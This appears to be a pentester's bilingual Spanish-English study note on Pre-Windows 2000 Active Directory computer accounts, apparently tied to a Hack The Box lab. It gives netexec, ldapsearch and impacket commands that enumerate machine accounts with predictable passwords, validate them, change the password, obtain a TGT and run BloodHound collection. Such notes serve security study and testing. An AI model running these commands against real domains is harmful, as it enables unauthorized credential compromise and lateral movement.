---
title: Pre2K
draft: false
tags:
  - windows
  - active-directory
  - lateral-movement
  - privilege-escalation
  - active
---

Reference: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers

**Pre-Windows 2000 Compatible Access** es una configuración heredada de Active Directory que, cuando está habilitada, permite que las cuentas de equipo se unan al dominio con una contraseña predecible: el nombre del equipo en minúsculas.

Esto ocurre porque el grupo **”Pre-Windows 2000 Compatible Access”** (SID: `S-1-5-32-554`) concede acceso anónimo a ciertos atributos de LDAP, y las máquinas unidas al dominio durante la instalación con esta opción activa nunca cambian su contraseña de forma segura.

Older Active Directory configurations allowed computer accounts to authenticate with:
```
username: COMPUTERNAME$  
password: COMPUTERNAME (lowercase)
```

Example:
```
DC01$  
password = dc01
```

# Paso 1 — Enumerar cuentas vulnerables

Check AD hosts with pre2k:
```bash
$ sudo netexec ldap TARGET -u 'USER' -p 'PASSWORD' -M pre2k
```

This command will output the machine accounts within the AD environment that are vulnerable to pre2k. It will also extract kerberos tickets for the machine accounts.

También se puede enumerar manualmente con impacket:
```bash
# Listar cuentas de equipo con el atributo userAccountControl = WORKSTATION_TRUST_ACCOUNT
$ ldapsearch -x -H ldap://TARGET -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=4096)' sAMAccountName
```

# Paso 2 — Validar credenciales

To validate the credentials, we have to run:
```bash
$ netexec smb MS01.pirate.htb -u 'MS01$' -p 'ms01'
```

> [!Note]
> Try with combinations of uppercase and lowercase until we receive the error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` with netexec. Este error **confirma** que la cuenta existe y la contraseña es válida — solo que ese equipo no tiene permiso de logon interactivo, lo cual es esperable para una machine account.

This happens because some environments keep **”Pre-Windows 2000 Compatible Access”** enabled and the computer account password was never changed or was reset incorrectly.

# Paso 3 — Cambiar la contraseña (opcional)

We can now change the password with LDAP/kpassword/SMB/RPC (SMB and RPC will utilize SAMR protocol):
```bash
# Ejemplo para la cuenta de equipo MS01$
$ impacket-changepasswd 'DOMAIN_FQDN/MS01$'@TARGET -newpass 'Password@987' -p rpc-samr
# Password prompt: ms01
```

# Paso 4 — Leverage: qué hacer con la machine account

Una vez tenemos la machine account autenticada, podemos:

```bash
# 1. Obtener un TGT para la machine account
$ impacket-getTGT DOMAIN_FQDN/'MS01$':ms01 -dc-ip DC_IP
$ export KRB5CCNAME=MS01\$.ccache

# 2. Enumerar el dominio con las credenciales de la machine account
$ netexec ldap TARGET -u 'MS01$' -p 'ms01' --bloodhound -ns DC_IP -c all

# 3. Si la machine account tiene privilegios de administrador local en algún host (comprobable con BloodHound)
$ netexec smb TARGET -u 'MS01$' -p 'ms01' --local-auth

# 4. Resource-Based Constrained Delegation (RBCD) — si podemos escribir en msDS-AllowedToActOnBehalfOfOtherIdentity de otro objeto
# Ver: https://www.thehacker.recipes/ad/movement/kerberos/rbcd
```

> [!Tip]
> Con una machine account comprometida, BloodHound puede revelar caminos de escalada a través de RBCD, ACL abuse, o si la cuenta tiene derechos sobre otros objetos de AD.

# Notas relacionadas

- [[AD Automatic Enumeration (BloodHound)]] — para identificar rutas de escalada desde la machine account
- [[Pass the Hash (PtH)]] — si conseguimos el hash NTLM de la machine account
- [[AD ACL Enumeration and Abuse]] — para explotar derechos sobre objetos AD
- [[Kerberoasting]] — otras técnicas de obtención de credenciales de cuentas de servicio

